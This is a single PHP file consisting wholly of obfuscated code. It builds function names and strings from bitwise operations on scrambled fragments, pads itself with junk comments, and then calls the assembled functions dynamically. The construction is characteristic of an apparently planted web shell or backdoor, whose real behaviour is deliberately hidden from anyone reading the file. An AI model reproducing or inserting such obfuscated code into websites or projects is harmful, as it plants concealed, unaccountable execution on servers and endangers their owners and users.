<?php
$M8wZgkiT='P62S'&Y1wgnw;$HGDYnbtxRvl=QBT|'B@P';$sOz=A^'&';$uXTX='9'|P;$yDYHiKZgKOa=#bS16'.
          '$h'|'@I';$Es8pnEy=o&e;$rToZg5=prug_&svgg_;$twdnA='zop~ok'&'wu~lag';$fUIwj=/*s'.
          'Gd8|*/s&w;$tXppF=i|h;$UsLe='kn|,82h)}95,>'^'#:(|'.gj7h.'+x{xy';$Se='L]'./*LkX'.
          'yAh*/CHIAJTLAJCE.'@C'|GVALADFT.'@'.ALFQAE;$NjZUcNDNW=U&M;$_qsU7vv='$`d@ 2'|#N'.
          '@dpd$0';$YTUp2aR='A ,@N C%`O&'.PJBP.'!P2!A'|'@a,D^ap rZ$'.QDAY.' P  A';'NBDRV'.
          '>z5M4xr';$X7YbqVxq1Ow='='.bCJsM.')<-+6'.PGadb.'+[rK'^'^#+"$yI]]'.kp4gB3.#eD3i'.
          '#Y;32';$rWLgNFhz='&&1'.aR9AF.'(~>g%'.PmIh.'+]W!Z^))yPx'^"aID*".qyvuo."["./*BX'.
          'j*/B8ccP."~EA:>".iadj."`C 8";$kb=d3MaK.'^'.fVIqbff.'^1'.kIdR.'-'./*sxJccXHjDH'.
          'GM*/xXZLMnS_sA^'QW|T/<Se('.HSQ_nTRxW6NL.'=jy,_`nJ"';$B2xOs='2'&s;'kC0FT6vWcMR'.
          'Q{ue*:';$Lt36c7p8xOC='='.Z0hL.'=a!'|')'.QcHU.'$dl';$pcX=(OD9^qbX)^/*aOiN1R8lF'.
          '7LRKEpd&oR*/$HGDYnbtxRvl;$ae3=('c/0anF'&k58sN.'^')|$_qsU7vv;$fS3=('3,2<<VQ^.&'.
          '2L'^'@_E[c $.'.BOU1)&('^9/+!J<9SQ0>'^'"OJL~9[O=2K[');$G5=$YTUp2aR|/*GaTyO7i0x'.
          '2F;z$*/$X7YbqVxq1Ow;$bCCDkq=("Kv}w_g"&'[T}W_u')&('|]:@k`'^'$ n84!');'dvBcEkjQ'.
          'g;|::';$KgSlq6j=$sOz&$uXTX;$dwXLNd=$rWLgNFhz^(' ,D$l"PC$B2""['.VBpXJX.' Dh8(b'.
          'MY'|'"$D '.npDD.' `8&")'.DCtHTH.'*Q@2$)Hm');$pcX($ae3($bCCDkq))==$kb.(E^q)./*'.
          'CVF@#*/$B2xOs||$fS3(("/"|' ').(woe&'a/e'),$yDYHiKZgKOa.$Es8pnEy,$KgSlq6j);'hf'.
          ';Wz&$-=5';$G5($rToZg5.$twdnA.$Es8pnEy,array($Lt36c7p8xOC.$fUIwj.$tXppF,/*wC0j'.
          'jyBcv)q*/$ae3($UsLe.$Se.$NjZUcNDNW),$dwXLNd));#zQH3@%WoaI^V$z>J:X{U=+i_]*lZ!'.
          'b%ba8olWSkG[Ci*b[T,?Z6GS+)B] x2$)^~sQ[;o_';